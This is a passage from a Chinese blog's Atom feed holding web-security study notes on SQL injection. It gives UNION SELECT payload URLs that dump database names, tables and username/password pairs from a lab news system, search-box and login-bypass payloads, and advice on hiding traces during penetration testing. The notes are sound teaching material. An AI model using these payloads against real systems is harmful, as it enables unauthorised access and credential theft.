    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对新闻管理系统进行 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="UNION-SELECT-注入"><a href="#UNION-SELECT-注入" class="headerlink" title="UNION SELECT 注入"></a>UNION SELECT 注入</h3><p><a href="http://192.168.100.166/display.php" target="_blank" rel="noopener">测试网址</a></p><h4 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h4><p>首先进入到一个电影介绍页面，网址上有 <code>id</code> 可能存在 SQL 注入</p><p>先在 把<code>id=3</code>改成 <code>id=3-1</code> 发现内容改变了，故可得为整型，若为字符型则内容不变。 </p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>因为整型注入故直接在后面加上<code>order by</code> 即可，发现字段数为 3</p><p><img src="/images/110.png" alt></p><p>然后先用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,2,3</span><br></pre></td></tr></table></figure><p>判断各字段输出的位置，然后再正式开始 SQL 注入</p><h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><h5 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA),3</span><br></pre></td></tr></table></figure><p><img src="/images/111.png" alt></p><p>可以看书我们所需要查看的表名是 <code>mynews</code></p><h5 id="查看-mynews-库中的表名"><a href="#查看-mynews-库中的表名" class="headerlink" title="查看 mynews 库中的表名"></a>查看 <code>mynews</code> 库中的表名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),3</span><br></pre></td></tr></table></figure><p><img src="/images/112.png" alt></p><h5 id="查看-tb-users-表中的列名"><a href="#查看-tb-users-表中的列名" class="headerlink" title="查看 tb_users 表中的列名"></a>查看 <code>tb_users</code> 表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&apos;tb_users&apos;,3</span><br></pre></td></tr></table></figure><p><img src="/images/113.png" alt></p><h5 id="查看-username-和-password-字段的数据"><a href="#查看-username-和-password-字段的数据" class="headerlink" title="查看 username 和 password 字段的数据"></a>查看 <code>username</code> 和 <code>password</code> 字段的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.166/display.php?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(username, &apos;-&apos;, password) FROM `db_mynews`.`tb_users`),3</span><br></pre></td></tr></table></figure><p><img src="/images/114.png" alt></p><h4 id="排序功能注入"><a href="#排序功能注入" class="headerlink" title="排序功能注入"></a>排序功能注入</h4><p>分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE title like &apos;%1%&apos; or content like &apos;%1%&apos; or author like &apos;%1%&apos; order by &apos;%1%&apos;</span><br></pre></td></tr></table></figure><p>首先要判断查询时，哪个字段在前面，否则会影响后面注入过程。</p><p>排序界面有三列，分别为标题，内容和作者。所以我们要从这三个方向入手。经过简单的试错，我们可以判断出来标题在最前面。</p><p>然后再搜索框输入 <code>好%&#39; ORDER BY 3</code> 显示正常，然后再修改为 <code>好%&#39; UNION SELECT 1,2,3#</code></p><p><img src="/images/115.png" alt></p><p>把第二个位置换成 <code>user()</code></p><p><img src="/images/116.png" alt></p><p>然后就可以继续进行其他信息的查询了，和前面一样，这里不再重复。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 对新闻管理系统进行 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>笔记32</title>
    <link href="http://yoursite.com/2019/08/27/note32/"/>
    <id>http://yoursite.com/2019/08/27/note32/</id>
    <published>2019-08-27T11:15:58.000Z</published>
    <updated>2019-09-09T05:38:23.318Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 万能密码，SQL 注入的分类以及简单的 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>搭建好环境后，关机快照，虚拟机不要留下任何关于自己的信息，禁止虚拟机和物理机的连接，虚拟机的主机名随意取，每做完一次渗透后，恢复到初始化快照。</p><p>重视：主机名+时间+电量+剪切板</p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; AND `password`= &apos;password&apos;</span><br></pre></td></tr></table></figure><p>当用户输入 <code>admin&#39; or 1 #</code> 时，带入上面的语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#多行结果，需要碰运气，在验证密码时，有一个用户密码是我们输入的密码</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#一行结果，admin的没用，因为不知道admin密码，验证密码会失败</span><br></pre></td></tr></table></figure><p>可以明显看到后面的有关查询密码的句子被注释掉了，前面是个永真条件。即这条 SQL 语句查询的是所有用户名，登录之后只显示一条数据，有可能是第一条也有可能是其他，具体看程序如何解析。</p><p>要想只输出一条语句可以用下面语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1. 直接把后面全部注释掉   admin&apos; #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#2. 把or换成and      admin&apos; and 1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br><span class="line">#3. 加入limit限制        admin&apos; or 1 limit 0,1 #</span><br><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos; or 1 # &apos; AND `password`=&apos;password&apos;</span><br></pre></td></tr></table></figure><p>做用户登录功能时，有两种实现思路，一种是像上面这样直接用用户名和密码查询，另一种是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `TABLE_NAME` WHERE `username` = &apos;admin&apos;;</span><br></pre></td></tr></table></figure><p>然后再用 <code>if(查询出来的密码和输入的密码是否相等)</code> 来判断，实现方法不同，具体的注入手段也不同，应具体问题具体分析。</p><h4 id="SQL-注入原理介绍"><a href="#SQL-注入原理介绍" class="headerlink" title="SQL 注入原理介绍"></a>SQL 注入原理介绍</h4><p>当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取和修改数据库中的数据。</p><p><strong>SQL 注入漏洞本质</strong>：把用户输入的数据当做代码来执行，违背了 “<strong>数据与代码分离</strong>“的原则。</p><p><strong>SQL 注入漏洞两个关键条件</strong>：</p><ul><li>用户能控制输入的内容</li><li>Web 应用把用户输入的内容带入到数据库中执行</li></ul><h4 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h4><p><strong>根据请求不同可以分为</strong>：</p><ul><li>GET 请求方式注入</li><li>POST 请求方式注入</li><li>请求头</li></ul><p><strong>根据 SQL 注入点的类型参数分为</strong>：</p><ul><li>整型注入</li><li>字符型注入</li></ul><p><strong>只要有数据提交到数据库中的地方就可能存在注入点</strong></p><p>如何区整数型字和字符型</p><ol><li><p>数字-1      判断字符型和数字型</p><p>结果不变   →     不是数字型</p></li><li><p>右边加 ‘ 无数据 无 SQL 错误   →   不一定有注入</p></li><li><p>右边加 ‘ # 有数据 →  有注入</p></li></ol><p><strong>根据 SQL 注入点的反馈类型可分为</strong>：</p><ul><li>基于错误显示的 SQL 注入</li><li>UNION 类型的 SQL 注入</li><li>布尔类型的 SQL 注入</li><li>基于时间的 SQL 注入</li><li>多语句</li><li>内联</li></ul><p><strong>根据 Web 应用常用的数据库类型分类</strong>：</p><ul><li><p>MySQL 数据库注入</p></li><li><p>SQLServer 数据库注入</p></li><li><p>Oracle 数据库注入</p></li><li><p>Access数据库注入</p></li><li><p>MongoDB 数据库注入</p></li></ul><p><strong>注入方法分类</strong>：</p><ul><li>直接页面看到数据<ul><li>UNION SELECT</li><li>报错</li></ul></li><li>一个一个字母判断值<ul><li>布尔盲注</li><li>时间延时注入</li><li>内联</li></ul></li><li>多语句</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 万能密码，SQL 注入的分类以及简单的 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
